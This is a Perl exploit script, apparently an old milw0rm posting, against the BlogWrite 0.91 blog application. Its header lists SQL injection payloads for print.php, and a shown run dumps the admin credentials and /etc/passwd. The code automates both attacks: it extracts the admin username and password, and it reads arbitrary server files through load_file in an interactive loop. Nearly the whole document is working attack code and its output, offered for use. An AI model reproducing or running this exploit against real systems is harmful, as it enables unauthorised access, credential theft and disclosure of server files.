#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  BlogWrite 0.91
# |Download        :  Can't remember 0o
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote FD / SQL Injection Exploit                                                                                                 |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  p0c : /[path]/print.php?id=[sql_string]
# |SQL Injections used by this sploit :
# |[1] /path]/print.php?id=-1' union all select 1,2,concat(user,0x3a,pass),4,5,6,0,8 from auth where id='1
# |[2] /path]/print.php?id=-1' union all select 1,2,load_file('lf'),4,5,6,0,8 from auth where id='1
# |----------------------------------------------------------------------------------------------------------------------------------|
# |No into dumpfile function, cos query is protected, had not been able to bypass it !
# |----------------------------------------------------------------------------------------------------------------------------------|

# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl sql3.txt http://localhost/blogwrite-0.91/ admin_hash
#
#   --------------------------------------
#       Blogwrite FD / SQL Inj Exploit
#              Coded by Osirys
#   -------------------------------------

# [*] Extracting admin credentials via Sql Injection ..
# [*] Username: admin
# [*] Password: password
#
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl sql3.txt http://localhost/blogwrite-0.91/ file_disc
#
#   --------------------------------------
#       Blogwrite FD / SQL Inj Exploit
#              Coded by Osirys
#   -------------------------------------

# [*] cat /etc/passwd
# root:x:0:0::/root:/bin/bash
# bin:x:1:1:bin:/bin:/bin/false
# daemon:x:2:2:daemon:/sbin:/bin/false
# adm:x:3:4:adm:/var/log:/bin/false
# lp:x:4:7:lp:/var/spool/lpd:/bin/false
# sync:x:5:0:sync:/sbin:/bin/sync
# shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
# halt:x:7:0:halt:/sbin:/sbin/halt
# mail:x:8:12:mail:/:/bin/false
# news:x:9:13:news:/usr/lib/news:/bin/false
# uucp:x:10:14:uucp:/var/spool/uucppublic:/bin/false
# operator:x:11:0:operator:/root:/bin/bash
# games:x:12:100:games:/usr/games:/bin/false
# ftp:x:14:50::/home/ftp:/bin/false
# smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
# mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false
# rpc:x:32:32:RPC portmap user:/:/bin/false
# sshd:x:33:33:sshd:/:/bin/false
# gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
# apache:x:80:80:User for Apache:/srv/httpd:/bin/false
# messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false
# haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false
# pop:x:90:90:POP:/:/bin/false
# nobody:x:99:99:nobody:/:/bin/false
# osirys:x:1000:100:Giovanni,,,:/home/osirys:/bin/bash
#
# [*] cat exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|


use LWP::UserAgent;
use HTTP::Request::Common;


my $host   = $ARGV[0];
my $expl   = $ARGV[1];

my $sql_inj_path = "/print.php?id=";
my $gen_sql_inj  = "-1' union all select 1,2,";

($host,$expl) || help("-1");
cheek($host,$expl) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&adm_hash if $expl_way == 1;
&file_discl if $expl_way == 2;

sub adm_hash {
    print "[*] Extracting admin credentials via Sql Injection ..\n";
    my $attack = $host.$sql_inj_path.$gen_sql_inj."concat(0x64657461696C73,user,0x3a,pass,0x64657461696C73),4,5,6,0,8 from auth where id='1";
    my $re = get_req($attack);
    if ($re =~ /details(.+):(.+)details/) {
        print "[*] Username: $1\n";
        print "[*] Password: $2\n\n";
        exit(0);
    }
    else {
        print "[-] Can't extract admin credentials\n[-] Exploit Failed !\n\n";
        exit(0);
    }
}

sub file_discl {
    print "[*] cat ";
    my $file = <STDIN>;
    chomp($file);
    $file !~ /exit/ || die "[-] Quitting ..\n";
    if ($file !~ /\/(.*)/) {
        print "\n[-] Bad filename !\n";
        &file_discl;
    }
    my $attack = $host.$sql_inj_path.$gen_sql_inj."load_file('".$file."'),4,5,6,0,8 from auth where id='1";
    my $re = get_req($attack);
    my $content = tag($re);
    if ($content =~ /<\/b><\/div><p>(.+)<\/p><h1>/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print "$out\n";
        &file_discl;
    }
    else {
        $c++;
        print "[-] Can't find ".$file." \n";
        $c < 3 || die "[-] File Disclosure failed !\n[-] Something wrong. Exploit Failed !\n\n";
        &file_discl;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub cheek() {
    my $host  = $_[0];
    my $expl  = $_[1];
    if ($host =~ /http:\/\/(.*)/) {
        $ch_host = 1;
    }
    if ($expl =~ /admin_hash/) {
        $ch_expl = 1;
        $expl_way = 1;
    }
    elsif ($expl =~ /file_disc/) {
        $ch_expl = 1;
        $expl_way = 2;
    }
    return 1 if ((($ch_host)&&($ch_expl)) == 1);
    &help("-2");
}

sub banner {
    print "\n".
          "  --------------------------------------\n".
          "      Blogwrite FD / SQL Inj Exploit    \n".
          "             Coded by Osirys            \n".
          "  ------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input Error, missed some arguments !\n\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad arguments !\n\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_hash\n";
    print "    Ex:     perl $0 http://site.it/cms/      admin_hash\n";
    print "[*] Usage : perl $0 http://hostname/cms_path file_disc\n";
    print "    Ex:     perl $0 http://site.it/cms/      file_disc\n";
    exit(0);
}

# milw0rm.com [2009-02-13]